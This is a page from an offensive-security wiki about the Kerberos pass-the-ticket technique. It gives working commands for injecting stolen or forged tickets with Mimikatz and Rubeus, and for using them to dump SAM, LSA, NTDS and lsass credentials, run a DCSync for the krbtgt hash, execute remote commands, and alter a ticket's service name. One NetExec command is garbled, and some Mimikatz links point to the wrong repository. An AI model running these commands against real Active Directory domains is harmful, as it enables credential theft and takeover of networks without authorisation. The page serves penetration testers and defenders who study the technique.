---
description: MITRE ATT&CK™ Sub-technique T1550.003
authors: 'CyrilleFranchet, ShutdownRepo, mpgn, sckdev'
category: ad
---

# Pass the ticket

## Theory

There are ways to come across ([cached Kerberos tickets](../credentials/dumping/cached-kerberos-tickets.md)) or forge ([overpass the hash](ptk.md), [silver ticket](forged-tickets/silver.md) and [golden ticket](forged-tickets/golden.md) attacks) Kerberos tickets. A ticket can then be used to authenticate to a system using Kerberos without knowing any password. This is called [Pass the ticket](ptt.md). Another name for this is Pass the Cache (when using tickets from, or found on, UNIX-like systems).

## Practice

> [!TIP] convert tickets UNIX <-> Windows
> Using [ticketConverter.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) (from the Impacket suite, written in Python).
> 
> ```bash
> # Windows -> UNIX
> ticketConverter.py $ticket.kirbi $ticket.ccache
> 
> # UNIX -> Windows
> ticketConverter.py $ticket.ccache $ticket.kirbi
> ```

### Injecting the ticket

* On Windows systems, tools like [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [Rubeus](https://github.com/GhostPack/Rubeus) inject the ticket in memory. Native Microsoft tools can then use the ticket just like usual.
* On UNIX-like systems, the path to the `.ccache` ticket to use has to be referenced in the environment variable `KRB5CCNAME`

::: tabs

=== UNIX-like

Once a ticket is obtained/created, it needs to be referenced in the `KRB5CCNAME` environment variable for it to be used by others tools.

```bash
export KRB5CCNAME=$path_to_ticket.ccache
```


=== Windows

The most simple way of injecting the ticket is to supply the `/ptt` flag directly to the command used to request/create a ticket. Both [mimikatz](https://github.com/GhostPack/Rubeus) and [Rubeus](https://github.com/GhostPack/Rubeus) accept this flag.

This can also be done manually with [mimikatz](https://github.com/GhostPack/Rubeus) using [`kerberos::ptt`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/ptt) or [Rubeus](https://github.com/GhostPack/Rubeus).

```powershell
# use a .kirbi file
kerberos::ptt $ticket_kirbi_file

# use a .ccache file
kerberos::ptt $ticket_ccache_file
```

```powershell
Rubeus.exe ptt /ticket:"base64 | file.kirbi"
```

It is then possible to list the tickets in memory using the `klist` command.

:::


### Passing the ticket

* On Windows, once Kerberos tickets are injected, they can be used natively.
* On UNIX-like systems, once the `KRB5CCNAME` variable is exported, the ticket can be used by tools that support Kerberos authentication.

::: tabs

=== Credentials dumping

The [Impacket](https://github.com/SecureAuthCorp/impacket) scripts like [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) have the ability to remotely dump hashes and LSA secrets from a machine.

```bash
secretsdump.py -k $TARGET
```

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound) (see [dumping credentials from registry hives](../credentials/dumping/sam-and-lsa-secrets.md)).

```bash
netexec smb $TARGETS -k --sam
netexec smb $TARGETS -k --lsa
netexecETS -k --ntds
```

[Lsassy](https://github.com/Hackndo/lsassy) (Python) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [NetExec](https://github.com/Pennyw0rth/NetExec) module (see [dumping credentials from lsass process memory](../credentials/dumping/lsass.md)).

```bash
netexec smb $TARGETS -k -M lsassy
netexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
lsassy -k $TARGETS
```

On Windows, once the ticket is injected, it will natively be used when accessing a service, for example with [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract the `krbtgt` hash with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync).

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```


=== Command execution

Some [Impacket](https://github.com/SecureAuthCorp/impacket) scripts (Python) enable testers to execute commands on target systems with Kerberos support.

```bash
psexec.py -k 'DOMAIN/USER@TARGET'
smbexec.py -k 'DOMAIN/USER@TARGET'
wmiexec.py -k 'DOMAIN/USER@TARGET'
atexec.py -k 'DOMAIN/USER@TARGET'
dcomexec.py -k 'DOMAIN/USER@TARGET'
```

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) has the ability to do it on a set of targets

```bash
netexec winrm $TARGETS -k -x whoami
netexec smb $TARGETS -k -x whoami
```

On Windows, legitimate tools like the [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) ([download](https://live.sysinternals.com/)) can then be used to open a cmd using that ticket.

```powershell
.\PsExec.exe -accepteula \\$TARGET cmd
```

:::


### Modifying the SPN

When requesting access to a service, a Service Ticket is used. It contains enough information about the user to allow the destination service to decide to grant access or not, without asking the Domain Controller. These information are stored in a protected blob inside the ST called PAC (Privilege Attribute Certificate). In theory, the user requesting access can't tamper with that PAC.

Another information stored in the ST, outside of the PAC, and unprotected, called `sname`, indicates what service the ticket is destined to be used for. This information is basically the SPN (Service Principal Name) of the target service. It's split into two elements: the service class, and the hostname.

Their are multiple service classes for multiple service types (LDAP, CIFS, HTTP and so on) (more info on [adsecurity.org](https://adsecurity.org/?page_id=183)). The problem here is that since the SPN is not protected, there are scenarios (e.g. services configured for [constrained delegations](delegations/constrained.md)) where the service class can be modified in the ticket, allowing attackers to have access to other types of services.

::: tabs

=== UNIX-like

This technique is implemented and attempted by default in all [Impacket](https://github.com/SecureAuthCorp/impacket) scripts when doing pass-the-ticket (Impacket tries to change the service class to something else, and calls this "AnySPN").

Impacket's tgssub.py script can also be used for manual manipulation of the service name value. _At the time of writing, 12th Feb. 2022,_ [_the pull request_](https://github.com/SecureAuthCorp/impacket/pull/1256) _adding this script is pending._

```bash
tgssub.py -in ticket.ccache -out newticket.ccache -altservice "cifs/target"
```


=== Windows

With [Rubeus](https://github.com/GhostPack/Rubeus), it can be conducted by supplying the `/altservice` flag when using the `s4u` or the `tgssub` modules and the whole SPN can be changed (service class and/or hostname).

```powershell
Rubeus.exe tgssub /altservice:cifs /ticket:"base64 | ticket.kirbi"
```

:::


## Resources

[https://www.secureauth.com/blog/kerberos-delegation-spns-and-more](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more)
